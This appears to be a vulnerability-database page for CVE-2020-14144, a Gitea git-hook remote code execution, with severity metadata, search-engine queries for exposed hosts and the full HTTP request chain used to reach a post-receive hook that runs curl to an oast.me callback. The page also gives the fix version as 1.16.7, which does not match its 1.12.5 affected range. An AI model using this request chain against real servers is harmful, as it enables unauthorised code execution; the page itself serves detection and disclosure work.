---
layout: "post"
cve_id: "CVE-2020-14144"
title: "Gitea 1.1.0 - 1.12.5 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-14144.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-14144.yaml"
author: "theamanrawat"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the target system.
"
remediation: "Fixed in version 1.16.7."
reference:
  - "https://dl.gitea.io/gitea/1.16.6"
  - "https://github.com/go-gitea/gitea/pull/13058"
  - "https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-14144"
  - "https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 7.2
  cve-id: "CVE-2020-14144"
  cwe-id: "CWE-78"
  epss-score: 0.93388
  epss-percentile: 0.99802
  cpe: "cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 7
  vendor: "gitea"
  product: "gitea"
  shodan-query: ['html:"Powered by Gitea Version"', 'http.html:"powered by gitea version"', 'http.title:"gitea"', 'cpe:"cpe:2.3:a:gitea:gitea"']
  fofa-query: ['body="powered by gitea version"', 'title="gitea"']
  google-query: "intitle:\"gitea\""
tags:
  - "cve2020"
  - "cve"
  - "rce"
  - "gitea"
  - "authenticated"
  - "git"
  - "intrusive"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
Gitea 1.1.0 through 1.12.5 is susceptible to authenticated remote code execution, via the git hook functionality, in customer environments where the documentation is not understood (e.g., one viewpoint is that the dangerousness of this feature should be documented immediately above the ENABLE_GIT_HOOKS line in the config file). NOTE: The vendor has indicated this is not a vulnerability and states "This is a functionality of the software that is limited to a subset of accounts. If you give someone the privilege to execute arbitrary code on your server, they can execute arbitrary code on your server. We provide very clear warnings to users around this functionality and what it provides."


## üåê HTTP Request
```nohighlight
GET /user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_csrf=E5oelP&user_name=jCwsFw&password=9cBsFOJr
```

```nohighlight
GET /repo/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.16
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /repo/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0: Win64: x64: rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 180
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_csrf=axgo1o&uid=1&repo_name=36haJ0dmOWI42Y0XPXzj5HOtamp&private=on&description=&repo_template=&issue_labels=&gitignores=&license=&readme=Default&auto_init=on&default_branch=master
```

```nohighlight
POST /jCwsFw/36haJ0dmOWI42Y0XPXzj5HOtamp/settings/hooks/git/post-receive HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; hu-HU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Connection: close
Content-Length: 92
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_csrf=axgo1o&content=%23%21%2Fbin%2Fbash%0D%0Acurl+d4tcpf9le0o40o6dcid0umuacgfjnqrmn.oast.me
```

```nohighlight
GET /jCwsFw/36haJ0dmOWI42Y0XPXzj5HOtamp/_new/master HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /jCwsFw/36haJ0dmOWI42Y0XPXzj5HOtamp/_new/master HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
Content-Length: 116
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_csrf=axgo1o&last_commit=7dF2c5&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct
```


